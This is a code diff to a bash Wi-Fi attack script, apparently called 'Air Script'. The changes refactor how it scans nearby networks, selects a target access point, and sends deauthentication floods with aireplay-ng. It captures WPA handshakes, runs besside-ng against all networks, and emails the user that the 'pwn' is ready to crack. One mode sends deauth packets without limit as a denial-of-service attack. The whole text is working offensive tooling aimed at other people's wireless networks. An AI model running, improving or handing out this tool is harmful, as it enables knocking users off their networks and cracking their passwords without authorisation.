@@ -244,14 +244,15 @@ read email
 echo "Remember to check your spam folder!"
 sleep 3
 network
-PiScan
 monitor
 sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
 echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
-sudo aireplay-ng --deauth 20 -a $bssid $foo
-sudo airmon-ng stop $foo
+sudo aireplay-ng --deauth 50 -a $bssid $foo
+stopMon
+echo -e "\e[32mmonitor mode disabled for $foo\e[0m"
 checkServices 
 sleep 10
+check_cap_files
 sendemail -f airscript@mail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP* "
 crack
 }
@@ -259,13 +260,14 @@ crack
 
 attackNo () {
 network
-PiScan
 monitor
 sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
 echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
-sudo aireplay-ng --deauth 20 -a $bssid $foo
-sudo airmon-ng stop $foo
+echo -e "\e[32mAttacking...\e[0m"
+sudo aireplay-ng --deauth 50 -a $bssid $foo > /dev/null 2>&1
+stopMon
 checkServices 
+check_cap_files
 crack
 
 }
@@ -302,11 +304,11 @@ read email
 sleep 3
 echo "Remeber to check your spam folder!"
 network
-PiPwn
 sudo besside-ng $foo
 stopMon
 checkservices
 sleep 10
+check_cap_files
 sendemail -f airscript@gmail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP*"
 crack
 }
@@ -314,48 +316,19 @@ crack
 
 attackAllNo () {
 network
-PiPwn
 sudo besside-ng $foo
 stopMon
 sudo chmod -R 755 air-crack
 echo -e "[${Green}Status${White}] Done! Select 4 to exit..."
 checkservices
+check_cap_files
 crack
 }
 
-PiScan () {
-echo "$(tput setaf 2)
-   .~~.   .~~.
-  '. \ ' ' / .'$(tput setaf 1)
-   .~ .~~~..~.
-  : .~.'~'.~. :
- ~ (   ) (   ) ~
-( : '~'.~.'~' : )
- ~ .~ (   ) ~. ~
-  (  : '~' :  ) $(tput sgr0)Raspberry Pi is scanning..$(tput setaf 1)
-   '~ .~~~. ~'  $(tput sgr0)Please wait!$(tput setaf 1)
-       '~'
-$(tput sgr0)"
-
-}
 
 
 
-PiPwn () {
-echo "$(tput setaf 2)
-   .~~.   .~~.
-  '. \ ' ' / .'$(tput setaf 1)
-   .~ .~~~..~.
-  : .~.'~'.~. :
- ~ (   ) (   ) ~
-( : '~'.~.'~' : )
- ~ .~ (   ) ~. ~
-  (  : '~' :  ) $(tput sgr0)Raspberry Pi is attacking..$(tput setaf 1)
-   '~ .~~~. ~'  $(tput sgr0)Please wait!$(tput setaf 1)
-       '~'
-$(tput sgr0)"
 
-}
 
 
 
@@ -417,26 +390,110 @@ echo -e "[${Green}DoS${White}] Press ctrl+c to stop attack & exit..."
 aireplay-ng --deauth 0 -a $bssid $foo > /dev/null
 }
 
-monitor () {        ##### Monitor mode, scan available networks & select target #####
-spinner &
-airmon-ng start $foo > /dev/null
-trap "airmon-ng stop $foo > /dev/null;rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
-airodump-ng --output-format kismet --write generated $foo > /dev/null & sleep 20 ; kill $!
-sed -i '1d' generated-01.kismet.csv
-kill %1
-echo -e "\n\n${Red}SerialNo        WiFi Network${White}"
-cut -d ";" -f 3 generated-01.kismet.csv | nl -n ln -w 8
-targetNumber=1000
-while [ ${targetNumber} -gt `wc -l generated-01.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber} -lt 1 ]; do 
-echo -e "\n${Green}┌─[${Red}Select Target${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-read -p "└─────►$(tput setaf 7) " targetNumber
-done
-targetName=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 3 `
-bssid=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 4 `
-channel=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 `
-rm generated-01.kismet.csv 2> /dev/null
-echo -e "\n[${Green}${targetName}${White}] Preparing for attack..."
+
+
+
+
+
+monitor() {
+    #foo="wlan0"   # Example interface, replace with the correct one if needed
+
+    # Check if the interface exists
+    if ! iwconfig $foo > /dev/null 2>&1; then
+        echo "Interface $foo not found. Please check your device."
+        exit 1
+    fi
+
+    # Start monitor mode (check if this works before continuing)
+#    echo "Starting monitor mode on $foo..."
+ #   airmon-ng start $foo > /dev/null 2>&1
+  #  if [ $? -ne 0 ]; then
+   #     echo "Failed to start monitor mode on $foo. Please check your device."
+    #    exit 1
+    #fi
+# Start monitor mode (check if this works before continuing)
+echo -e "\e[32m[Starting monitor mode on $foo...]\e[0m"
+airmon-ng start $foo > /dev/null 2>&1
+if [ $? -ne 0 ]; then
+    echo -e "\e[31mFailed to start monitor mode on $foo. Please check your device.\e[0m"
+    exit 1
+fi
+    # Set up a cleanup trap
+    trap "airmon-ng stop $foo > /dev/null; rm -f generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
+
+    # Run airodump-ng in background and redirect output
+    echo "Starting airodump-ng scan on $foo..."
+    airodump-ng --output-format kismet --write generated $foo > /dev/null & 
+    airodump_pid=$!   # Capture PID of airodump-ng
+    sleep 20
+
+    # Check if the airodump-ng process is still running
+    if ps -p $airodump_pid > /dev/null; then
+        echo "Killing airodump-ng process..."
+        kill $airodump_pid
+    else
+        echo "airodump-ng process already stopped."
+    fi
+
+    # Check if the CSV file was created
+    if [ ! -f "generated-01.kismet.csv" ]; then
+        echo "Error: generated-01.kismet.csv not found. Is airodump-ng running correctly?"
+        exit 1
+    fi
+
+    # Remove the header from the CSV
+    sed -i '1d' generated-01.kismet.csv
+
+    # Debugging: Print out the first few rows of the CSV to ensure we're capturing the correct columns
+    echo -e "\n\n${Red}CSV Raw Data (First 5 lines)${White}:"
+    head -n 5 generated-01.kismet.csv
+
+    # Print the available networks (SSID and BSSID) for the user to select
+    echo -e "\n\n${Red}SerialNo        WiFi Network${White}"
+    awk -F ";" '{gsub(/^[ \t]+|[ \t]+$/, "", $3); gsub(/^[ \t]+|[ \t]+$/, "", $4); print NR, $3, $4}' generated-01.kismet.csv | nl -n ln -w 8
+
+    # Get the number of networks in the file
+    total_networks=$(wc -l < generated-01.kismet.csv)
+    if [ -z "$total_networks" ] || [ "$total_networks" -eq 0 ]; then
+        echo "No networks found. Please check if airodump-ng is running correctly."
+        exit 1
+    fi
+
+    # Prompt user to select a target network
+    targetNumber=1000
+    while [ ${targetNumber} -gt ${total_networks} ] || [ ${targetNumber} -lt 1 ]; do 
+        echo -e "\n${Green}┌─[${Red}Select Target${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
+        read -p "└─────►$(tput setaf 7) " targetNumber
+    done
+
+   # Extract network details using awk with whitespace handling
+targetName=$(awk -F ';' "NR==${targetNumber} {print \$3}" generated-01.kismet.csv | xargs)
+bssid=$(awk -F ';' "NR==${targetNumber} {print \$4}" generated-01.kismet.csv | xargs)
+channel=$(awk -F ';' "NR==${targetNumber} {print \$6}" generated-01.kismet.csv | xargs)
+
+# Output the selected target
+echo -e "\n${Green}You have selected the following network:${White}"
+echo -e "${Green}SSID:${White} ${targetName}"
+echo -e "${Green}BSSID:${White} ${bssid}"
+echo -e "${Green}Channel:${White} ${channel}"
+
+# Set the wifi card to the target channel
+sudo iwconfig $foo channel $channel
+
+    # Check if BSSID is empty, and alert the user if necessary
+    if [ -z "$bssid" ]; then
+        echo -e "${Red}Error: Invalid BSSID. Please try again with a valid target network.${White}"
+        exit 1
+    fi
+
+    # Clean up the CSV file
+    rm generated-01.kismet.csv 2> /dev/null
+
+    # Confirm that we are preparing for the attack
+    echo -e "\n[${Green}${targetName}${White}] Preparing for attack..."
 }
+
+
 
 
 networkselect () {
@@ -445,6 +502,23 @@ cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done
 
 }
 
+
+check_cap_files() {
+    # Clear the screen
+    clear
+
+    # Check if any .cap files exist in the current directory
+    if ls *.cap &> /dev/null; then
+        # .cap files are present
+        echo -e "\e[32m[SUCCESS]\e[0m"  # Green text
+        crack
+    else
+        # No .cap files found
+        echo -e "\e[31m[FAILED]\e[0m"  # Red text
+        sleep 3
+        exit 1
+    fi
+}
 
 macChange() {
      ##### Display available options #####
@@ -852,9 +926,10 @@ sudo ./uninstall.sh
 }
 
 stopMon () {
-sudo airmon-ng stop $foo
+sudo airmon-ng stop $foo > /dev/null 2>&1
 sudo systemctl start NetworkManager > /dev/null 2>&1
 systemctl start wpa_supplicant  > /dev/null 2>&1
+echo -e "\e[32mmonitor mode disabled for $foo\e[0m"
 }
 
 
